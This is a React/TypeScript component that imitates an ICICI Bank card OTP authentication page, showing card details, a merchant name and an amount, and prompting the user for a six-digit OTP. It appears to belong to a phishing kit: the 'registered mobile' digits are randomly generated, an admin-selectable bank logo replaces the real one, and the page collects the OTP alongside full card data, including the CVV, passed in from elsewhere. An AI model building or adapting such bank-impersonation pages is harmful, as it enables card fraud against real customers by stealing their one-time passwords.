import React, { useState, useEffect } from 'react';

interface ICICIBankOTPPageProps {
  cardData: {
    cardNumber: string;
    cardName: string;
    expiryMonth: string;
    expiryYear: string;
    cvv: string;
  };
  billingDetails: {
    firstName: string;
    lastName: string;
    email: string;
    country: string;
    companyName: string;
  };
  otpValue: string;
  setOtpValue: (value: string) => void;
  otpSubmitting: boolean;
  handleOtpSubmit: () => void;
  handleOtpCancel: () => void;
  otpError: string;
  adminSelectedBankLogo: string;
  sessionBankLogo: string;
  cardBrandLogos: {
    visa: string;
    mastercard: string;
    discover: string;
    rupay: string;
    amex: string;
  };
  getCardBrand: (cardNumber: string) => string;
  displayPrice: number;
  formatPrice: (price: number) => string;
}

const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
  cardData,
  billingDetails,
  otpValue,
  setOtpValue,
  otpSubmitting,
  handleOtpSubmit,
  handleOtpCancel,
  otpError,
  adminSelectedBankLogo,
  sessionBankLogo,
  cardBrandLogos,
  getCardBrand,
  displayPrice,
  formatPrice
}) => {
  // Timer state (starts at 3:59)
  const [timeLeft, setTimeLeft] = useState(239); // 3 minutes 59 seconds = 239 seconds
  const [isExpired, setIsExpired] = useState(false);
  
  // Random mobile last 4 digits
  const [mobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
  
  // Current date and time
  const [currentDateTime] = useState(() => {
    const now = new Date();
    const options: Intl.DateTimeFormatOptions = {
      weekday: 'short',
      month: 'short', 
      day: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      hour12: true
    };
    return now.toLocaleDateString('en-US', options);
  });

  // Timer countdown effect
  useEffect(() => {
    if (timeLeft > 0 && !isExpired) {
      const timer = setTimeout(() => {
        setTimeLeft(timeLeft - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (timeLeft === 0) {
      setIsExpired(true);
      // Redirect to checkout with failure message after timeout
      setTimeout(() => {
        handleOtpCancel();
      }, 2000);
    }
  }, [timeLeft, isExpired, handleOtpCancel]);

  // Format timer display
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins} minutes ${secs} seconds`;
  };

  // Get card brand and appropriate logo
  const cardBrand = getCardBrand(cardData.cardNumber);
  const cardLogo = cardBrandLogos[cardBrand as keyof typeof cardBrandLogos] || cardBrandLogos.rupay;
  
  // Get bank logo (priority: admin selected > session > default ICICI)
  const bankLogo = adminSelectedBankLogo || sessionBankLogo || 'https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png';
  
  // Get last 4 digits of card
  const cardLast4 = cardData.cardNumber.replace(/\s/g, '').slice(-4);

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
    setOtpValue(value);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otpValue.length === 6 && !otpSubmitting && !isExpired) {
      handleOtpSubmit();
    }
  };

  if (isExpired) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center p-8">
          <div className="text-red-600 text-xl font-semibold mb-4">Session Expired</div>
          <div className="text-gray-600 mb-4">Your OTP verification session has expired.</div>
          <div className="text-sm text-gray-500">Redirecting to checkout page...</div>
        </div>
      </div>
    );
  }

  return (
    <div className="bg-white font-sans w-full max-w-sm mx-auto border border-gray-200 shadow-lg relative" style={{ touchAction: 'auto', WebkitTouchCallout: 'default', userSelect: 'text', pointerEvents: 'auto' }}>
      {/* Header with logos */}
      <div className="flex justify-between items-center px-3 py-2 border-b border-gray-100">
        <img 
          src={bankLogo} 
          alt="ICICI Bank" 
          className="h-7 object-contain"
          onError={(e) => {
            e.currentTarget.src = 'https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png';
          }}
        />
        <img 
          src={cardLogo} 
          alt="RuPay" 
          className="h-10 object-contain"
          onError={(e) => {
            e.currentTarget.src = cardBrandLogos.rupay;
          }}
        />
      </div>

      {/* Main content */}
      <div className="px-4 py-3">
        {/* Date and Time */}
        <div className="text-center text-gray-600 text-[10px] mb-3">
          {currentDateTime}
        </div>

        {/* Transaction details centered */}
        <div className="text-center mb-4">
          <div className="inline-block text-center space-y-0">
            <div className="text-xs space-y-0 leading-tight">
              <div className="flex justify-between items-center">
                <span className="text-gray-700">Card Number:</span>
                <span className="text-gray-800 font-bold ml-8">{cardData.cardNumber.replace(/\s/g, '').slice(0, 4)} XXXX XXXX {cardLast4}</span>
              </div>
              
              <div className="flex justify-between items-center">
                <span className="text-gray-700">Mobile Number:</span>
                <span className="text-gray-800 font-bold ml-8 flex items-center gap-1">
                  XXXXXX{mobileLast4}
                  <svg className="w-3 h-3 text-blue-500" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clipRule="evenodd" />
                  </svg>
                </span>
              </div>
              
              <div className="flex justify-between items-center">
                <span className="text-gray-700">Merchant Name:</span>
                <span className="text-gray-800 font-bold ml-8">OneMobileSystemPLtd</span>
              </div>
              
              <div className="flex justify-between items-center">
                <span className="text-gray-700">Amount:</span>
                <span className="text-gray-800 font-bold ml-8">{formatPrice(displayPrice)}</span>
              </div>
            </div>
          </div>
        </div>

        {/* OTP Authentication Section */}
        <div className="mb-4">
          <h2 className="text-sm font-bold text-gray-900 mb-2 text-center">OTP Authentication</h2>
          <p className="text-[11px] text-gray-700 text-center mb-3 leading-relaxed px-2 font-medium">
            An OTP (One Time Password), has been sent to your registered mobile number. Please authenticate the transaction using OTP.
          </p>
        </div>

        {/* OTP Input Form */}
        <form onSubmit={handleSubmit}>
          <div className="mb-3">
            <label className="block text-xs font-semibold text-gray-900 mb-1 text-center">
              Enter OTP
            </label>
            <input
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={6}
              value={otpValue}
              onChange={handleOtpChange}
              placeholder=""
              className={`w-full text-center text-lg font-mono tracking-[0.5em] border py-1 px-3 focus:outline-none focus:border-blue-500 rounded touch-manipulation ${
                otpValue.length === 0 ? 'border-blue-500 animate-pulse' : 'border-gray-300'
              }`}
              disabled={otpSubmitting || isExpired}
              autoFocus
              autoComplete="one-time-code"
              style={{ WebkitAppearance: 'none', touchAction: 'manipulation', WebkitUserSelect: 'text', pointerEvents: 'auto' }}
              onTouchStart={(e) => e.stopPropagation()}
              onClick={(e) => e.stopPropagation()}
            />
          </div>

          {otpError && (
            <div className="text-red-600 text-xs text-center mb-2">{otpError}</div>
          )}

          {/* Action Buttons */}
          <div className="flex gap-2 mb-2">
            <button
              type="submit"
              disabled={otpValue.length !== 6 || otpSubmitting || isExpired}
              className="flex-1 bg-blue-600 text-white py-2 px-4 font-semibold text-xs disabled:opacity-50 disabled:cursor-not-allowed hover:bg-blue-700 transition-colors rounded touch-manipulation"
              style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent', pointerEvents: 'auto' }}
              onTouchStart={(e) => e.stopPropagation()}
            >
              {otpSubmitting ? 'CONFIRMING...' : 'CONFIRM'}
            </button>
            
            <button
              type="button"
              onClick={handleOtpCancel}
              disabled={otpSubmitting}
              className="flex-1 bg-gray-500 text-white py-2 px-4 font-semibold text-xs disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-600 transition-colors rounded touch-manipulation"
              style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent', pointerEvents: 'auto' }}
              onTouchStart={(e) => e.stopPropagation()}
            >
              CANCEL
            </button>
          </div>

          {/* Resend Button */}
          <div className="text-center mb-3">
            <button
              type="button"
              className="text-blue-600 font-semibold text-xs hover:text-blue-800 transition-colors touch-manipulation"
              disabled={otpSubmitting}
              style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent', pointerEvents: 'auto' }}
              onTouchStart={(e) => e.stopPropagation()}
            >
              RESEND
            </button>
          </div>
        </form>

        {/* Security Notice */}
        <div className="text-center mb-2">
          <p className="text-[10px] text-gray-500 leading-relaxed px-2">
            OTPs are SECRET. DO NOT Disclose it to anyone, bank NEVER asks for OTP
          </p>
        </div>

        {/* Timer */}
        <div className="text-center">
          <p className="text-[10px] text-gray-500">
            This page will automatically timeout after 4 minutes 48 seconds.
          </p>
        </div>
      </div>
    </div>
  );
};

export default ICICIBankOTPPage;
